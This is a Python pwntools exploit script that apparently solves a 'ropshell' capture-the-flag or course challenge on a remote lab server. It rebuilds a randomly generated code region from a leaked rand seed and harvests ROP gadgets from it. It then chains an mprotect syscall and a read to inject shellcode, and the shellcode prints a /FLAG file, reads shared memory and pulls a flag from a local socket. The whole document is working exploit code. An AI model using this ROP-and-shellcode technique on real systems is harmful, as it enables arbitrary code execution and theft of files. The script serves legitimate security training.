#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import pow as pw
from pwn import *
import pwnlib.shellcraft.amd64

from mmap import PROT_READ, PROT_WRITE, PROT_EXEC, PAGESIZE
from os import O_RDWR, O_CREAT, O_RDONLY

import binascii     # byte to string
from ctypes import *
import ctypes       # c lib
libc = ctypes.CDLL('libc.so.6')

context.arch = 'amd64'
context.os = 'linux'

# open server
r = None
if 'qemu' in sys.argv[1:]:
    r = process("qemu-x86_64-static ./ropshell", shell=True)
elif 'bin' in sys.argv[1:]:
    r = process("./ropshell", shell=False)
elif 'local' in sys.argv[1:]:
    r = remote("localhost", 10494)
else:
    r = remote("up23.zoolab.org", 10494)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)


# get parameters
r.recvuntil(b'Timestamp is ')
randSeed = int(r.recvuntil(b'**')[:-2].decode('ascii'), 10)
randSeed = ctypes.c_long(randSeed).value
# print(randSeed)

r.recvuntil(b'Random bytes generated at ')
baseAddr = int(r.recvuntil(b'**')[:-2].decode('ascii'), 16)
baseAddr = ctypes.c_uint64(baseAddr).value
# print(baseAddr, ctypes.c_uint64(baseAddr))


# generate codeint[]
LEN_CODE = ctypes.c_uint32(10*0x10000).value
# print(f'LEN_CODE = {LEN_CODE} {LEN_CODE//4}')

codeint = [None] * LEN_CODE
codeintByte = []
libc.srand(randSeed)
# print(f'rand = {libc.rand()} {ctypes.c_uint32(libc.rand())}')

for i in range(LEN_CODE//4):
    # codeint[i] = ((libc.rand() << 16) | (libc.rand() & 0xffff))
    shift = (ctypes.c_uint32(libc.rand()).value << 16)
    bitwiseAnd = (ctypes.c_uint32(libc.rand()).value & 0xffff)
    
    codeint[i] = ctypes.c_uint32(shift | bitwiseAnd)
    codeintByte.append(int(codeint[i].value).to_bytes(4, "little"))

# Insert "syscall+ret" 
idx2SysRet = ctypes.c_uint32(libc.rand()).value % (LEN_CODE//4 - 1)
codeint[idx2SysRet] = ctypes.c_uint32(0xc3050f)
codeintByte[idx2SysRet] = int(codeint[idx2SysRet].value).to_bytes(4, "little")


# prepare asm
rax     = [asm('''pop rax; ret;'''), -1, False]
rdi     = [asm('''pop rdi; ret; '''), -1, False]
syscall = [asm('''syscall; ret; '''), -1, False]

# find address of asm in codeintByte[]
# print(f'rax = {rax} {rax[0]}, rdi = {rdi}, syscall = {syscall}') 
for idx, byteStr in enumerate(codeintByte):
    if rax[0] in byteStr and not rax[2]:
        rax[1] = (baseAddr + idx*4 + byteStr.index(rax[0]))
        rax[2] = True
        # print(f'{idx:>6}: {"rax":>7} = {byteStr.index(rax[0])} {rax} {byteStr}')
        
    if rdi[0] in byteStr and not rdi[2]:
        rdi[1] = (baseAddr + idx*4 + byteStr.index(rdi[0]))
        rdi[2] = True
        # print(f'{idx:>6}: {"rdi":>7} = {byteStr.index(rdi[0])} {rdi} {byteStr}')
        
    if syscall[0] in byteStr and not syscall[2]:
        syscall[1] = (baseAddr + idx*4 + byteStr.index(syscall[0]))
        syscall[2] = True
        # print(f'{idx:>6}: syscall = {byteStr.index(syscall[0])} {syscall} {byteStr}')

# part 1: upload and exit(37)
exitAsm37 = p64(rax[1]) + p64(0x3c) + \
            p64(rdi[1]) + p64(37) + \
            p64(syscall[1])
# r.sendafter(b'shell> ', exitAsm37)

# part 2: 
# mprotect via ROP (open segment of codeint[] to write)
# trigger read via ROP (fd = stdin, *buf = segment address)
# prepare my shell code (e.g.: byte string of "/FLAG")
# jump to codeint[] segment to execute the shell code

print(f'part 2')
rsi = [asm('''pop rsi; ret; '''), -1, False]
rdx = [asm('''pop rdx; ret; '''), -1, False]
pushRax = [asm('''push rax; ret; '''), -1, False]

for idx, byteStr in enumerate(codeintByte):
    if rsi[0] in byteStr and not rsi[2]:
        rsi[1] = (baseAddr + idx*4 + byteStr.index(rsi[0]))
        rsi[2] = True
        # print(f'{idx:>6}: {"rsi":>7} = {byteStr.index(rsi[0])} {rsi} {byteStr}')
        
    if rdx[0] in byteStr and not rdx[2]:
        rdx[1] = (baseAddr + idx*4 + byteStr.index(rdx[0]))
        rdx[2] = True
        # print(f'{idx:>6}: {"rdx":>7} = {byteStr.index(rdx[0])} {rdx} {byteStr}')
        
mprotectAsm = p64(rax[1]) + p64(0xa) + \
              p64(rdi[1]) + p64(baseAddr) + \
              p64(rsi[1]) + p64(PAGESIZE) + \
              p64(rdx[1]) + p64(PROT_EXEC | PROT_WRITE | PROT_READ) + \
              p64(syscall[1]) 

readFlagFile  = shellcraft.open('/FLAG', O_RDONLY, 755)
readFlagFile += shellcraft.read('rax', 'rsp', 67)        # 'rax' = file descriptor / 'rsp' = string buf / 67 = string buf size
readFlagFile += shellcraft.write(1, 'rsp', 67)           # write buf to stdout
# readFlagFile += 'ret\n'
# print(f'{readFlagFile} {len(readFlagFile)} {asm(readFlagFile)} {O_RDONLY}')
# print(f'{asm(readFlagFile)}')

writeBaseaddrAsmPart2 = p64(rax[1]) + p64(0) + \
                        p64(rdi[1]) + p64(0) + \
                        p64(rsi[1]) + p64(baseAddr) + \
                        p64(rdx[1]) + p64(len(readFlagFile)) + \
                        p64(syscall[1]) 

# Send to server
# mprotect -> write shell code to codeint[] -> insert codeint[] address -> execute the shell code -> exit with 37
# r.sendafter(b'shell> ', mprotectAsm + writeBaseaddrAsmPart2 + p64(baseAddr) + exitAsm37)
# r.sendafter(b'received.\n', asm(readFlagFile))


# part 3
# arg0 (%rdi) | arg1 (%rsi)	| arg2 (%rdx)
# 0x1d: shmget(0x1337, 4096, 0x400)
# 0x1e: shmat('rax', 0, 0)
# 0x01: write(1, 'rsp', 69)

print(f'part 3')
readFlagSharedMem  = '\t/* 0x1d: shmget(0x1337, 4096, 0x400) */\n'
readFlagSharedMem += '\tpush 0x1d\n'
readFlagSharedMem += '\tpop  rax\n'
readFlagSharedMem += '\tpush 0x1337\n'
readFlagSharedMem += '\tpop  rdi\n'
readFlagSharedMem += '\tpush 4096\n'
readFlagSharedMem += '\tpop  rsi\n'
readFlagSharedMem += '\tpush 0x400\n'
readFlagSharedMem += '\tpop  rdx\n'
readFlagSharedMem += '\tsyscall\n'
readFlagSharedMem += '\t/* 0x1e: shmat("rax", 0, SHM_RDONLY) */\n'
readFlagSharedMem += '\tmov  rdi, rax\n'
readFlagSharedMem += '\tpush 0x1e\n'
readFlagSharedMem += '\tpop  rax\n'
readFlagSharedMem += '\txor  rsi, rsi\n'
readFlagSharedMem += '\tpush 4096\n'
readFlagSharedMem += '\tpop  rdx\n'
readFlagSharedMem += '\tsyscall\n'
readFlagSharedMem += shellcraft.write(1, 'rax', 69)
# readFlagSharedMem += '\tret\n'

writeBaseaddrAsmPart3 = p64(rax[1]) + p64(0) + \
                        p64(rdi[1]) + p64(0) + \
                        p64(rsi[1]) + p64(baseAddr) + \
                        p64(rdx[1]) + p64(len(readFlagSharedMem)) + \
                        p64(syscall[1]) 

# print(f'readFlagSharedMem = {readFlagSharedMem} {asm(readFlagSharedMem)}')
# r.sendafter(b'shell> ', mprotectAsm + writeBaseaddrAsmPart3 + p64(baseAddr) + exitAsm37)
# r.sendafter(b'received.\n', asm(readFlagSharedMem))
# r.sendline(asm(readFlagSharedMem))


# part 4
print(f'part 4')
readFlagServer  = shellcraft.connect('127.0.0.1', 0x1337)
readFlagServer += shellcraft.read('rbp', 'rsp', 67)
readFlagServer += shellcraft.write(1, 'rsp', 67)
readFlagServer += shellcraft.exit(37)
# readFlagServer += '\tret\n'

writeBaseaddrAsmPart4 = p64(rax[1]) + p64(0) + \
                        p64(rdi[1]) + p64(0) + \
                        p64(rsi[1]) + p64(baseAddr) + \
                        p64(rdx[1]) + p64(len(readFlagFile) + len(readFlagSharedMem) + len(readFlagServer)) + \
                        p64(syscall[1]) 

# print(f'readFlagServer = {readFlagServer} {asm(readFlagServer)}')
# print(f'{mprotectAsm + writeBaseaddrAsmPart4 + p64(baseAddr)}')
r.sendafter(b'shell> ', mprotectAsm + writeBaseaddrAsmPart4 + p64(baseAddr))
r.sendafter(b'received.\n', asm(readFlagFile) + asm(readFlagSharedMem) + asm(readFlagServer))


r.interactive()
# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
